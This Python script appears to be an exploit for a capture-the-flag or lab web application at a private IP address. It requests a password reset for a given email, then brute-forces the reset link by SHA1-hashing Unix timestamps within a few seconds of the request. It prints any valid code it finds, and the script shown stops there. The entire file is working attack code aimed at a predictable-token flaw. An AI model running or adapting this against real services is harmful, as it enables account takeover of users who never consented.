import requests
import sys
from datetime import datetime
import hashlib

DIFF = 8
PROXIES=None

def get_csrf_token(res):
    token_index = res.text.find("_token")
    token = res.text[token_index:].split('"')[2]
    return token

def get_password_reset_token(email):
    s = requests.Session()
    res = s.get("http://172.16.238.100/resetpassword", verify=False, proxies=PROXIES)
    token = get_csrf_token(res)

    res = s.post("http://172.16.238.100/resetpassword", {
        "_token": token,
        "email": email
        }, verify=False, proxies=PROXIES)

    if("An email has been sent to reset the password" in res.text):
        print("[*] The password has been reset!")
    else:
        print("[-] Couldn't reset the password!")
        sys.exit(-1)

    password_reset_time = str(datetime.now().timestamp()).split(".")[0]

    possible_password_reset_times = [str(i) for i in range(int(password_reset_time)-DIFF,
            int(password_reset_time) + DIFF)]

    possible_password_reset_codes = [hashlib.sha1(code.encode()).hexdigest() 
            for code in possible_password_reset_times]

    found = False
    for possible_code in possible_password_reset_codes:
        res = s.get("http://172.16.238.100/reset?code=" + possible_code, verify=False, proxies=PROXIES)
        if("New Password" in res.text):
            found = True
            print("[+] Found password reset code:", possible_code)
            token = get_csrf_token(res)
            password_reset_code = possible_code

    if(not found):
        print("[-] Couldn't find the password reset code")
        sys.exit(-1)

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print(f"python {sys.argv[0]} <email>")
        print(f"python {sys.argv[0]} khalid@omani.cloud")
        sys.exit(0)
    get_password_reset_token(sys.argv[1])
